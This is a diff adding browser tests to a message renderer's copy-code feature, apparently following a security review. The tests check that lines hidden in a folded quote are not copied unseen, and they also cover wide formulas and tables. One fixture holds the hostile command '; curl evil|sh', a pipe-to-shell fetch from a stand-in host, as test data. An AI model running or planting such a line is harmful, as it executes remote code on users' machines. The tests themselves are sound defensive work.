@@ -678,6 +678,30 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
     }
   }
   check('the copy icon leaves out what a formula moves out of the code, a folded quote cuts off, other slides and text in the colour of its background', unseen.length === 0, unseen.join('; '));
+  // code in a folded quote: the quote cuts off its lines too, and a click on the icon does not unfold it (security
+  // review of #227); unfolded, all of it is seen
+  const folded = [];
+  for (const rm of [{ html: '<blockquote expandable>1<pre>ls\n2\n3\n4\n5\n; curl evil|sh</pre></blockquote>' }, { markdown: 'Цитата:\n\n<blockquote expandable>1<pre>ls\n2\n3\n4\n5\n; curl evil|sh</pre></blockquote>' }]) {
+    const [got] = await copies(rm);
+    const open = await page.evaluate(() => {
+      /** @type {HTMLElement} */ (document.querySelector('#out .tg-expandable')).click();
+      window.__copied = null;
+      /** @type {HTMLElement} */ (document.querySelector('#out .tg-pre-copy')).click();
+      return window.__copied;
+    });
+    if (!got || /curl/.test(got.copied) || !got.copied.startsWith('ls') || open !== 'ls\n2\n3\n4\n5\n; curl evil|sh') folded.push(`${Object.keys(rm)[0]}: ${JSON.stringify([got?.copied, open])}`);
+  }
+  check('the copy icon leaves out the lines of code a folded quote around it cuts off', folded.length === 0, folded.join('; '));
+  // a wide formula or table in code scrolls in a box of its own: all it scrolls to is seen (security review of #227)
+  const wide = [];
+  for (const [html, want] of [
+    ['<pre>ls<tg-math-block>' + 'a+'.repeat(150) + 'z</tg-math-block></pre>', 'ls\n' + 'a+'.repeat(150) + 'z'],
+    ['<pre><table><tr><td>' + 'x'.repeat(100) + '</td><td>END</td></tr></table></pre>', 'x'.repeat(100) + '\tEND'],
+  ]) {
+    const [got] = await copies({ html });
+    if (got?.copied !== want) wide.push(`${html.slice(0, 30)}…: ${JSON.stringify(got?.copied)}`);
+  }
+  check('the copy icon copies a wide formula and a wide table in code whole', wide.length === 0, wide.join('; '));
   // a post written right to left: its code scrolls to the left, and that is seen too
   const long = 'ls' + ' '.repeat(300) + '; длинная строка';
   const rtl = await copies({ html: `<pre>${long}</pre><pre>שלום${' '.repeat(300)}עולם</pre>`, is_rtl: true });
@@ -886,6 +910,9 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   // code, from the first one each time; a line that crosses the edge of a box is looked through by halves
   await linear('copy: lines of code from blocks', 'copy', (n) => ({ blocks: [{ type: 'pre', text: 'a b\n'.repeat(n) }] }), 1500);
   await linear('copy: a slide of lines wider than it in code', 'copy', (n) => ({ html: '<pre><tg-slideshow><b>' + ('x'.repeat(60) + '\n').repeat(n) + '</b></tg-slideshow></pre>' }), 150);
+  // what is behind a formula was looked up from each formula through all the tags above it (security review of #227)
+  const formulasIn = (depth) => ({ html: '<pre>' + '<b>'.repeat(depth) + '<tg-math>x</tg-math>'.repeat(1600) + '</pre>' });
+  await asPlain('copy: formulas deep in tags', 'copy', formulasIn(512), formulasIn(1));
 }
 
 check('no script ran and no page errors', (await page.evaluate(() => window.__xss)) === 0 && pageErrors.length === 0, pageErrors.join(' | '));
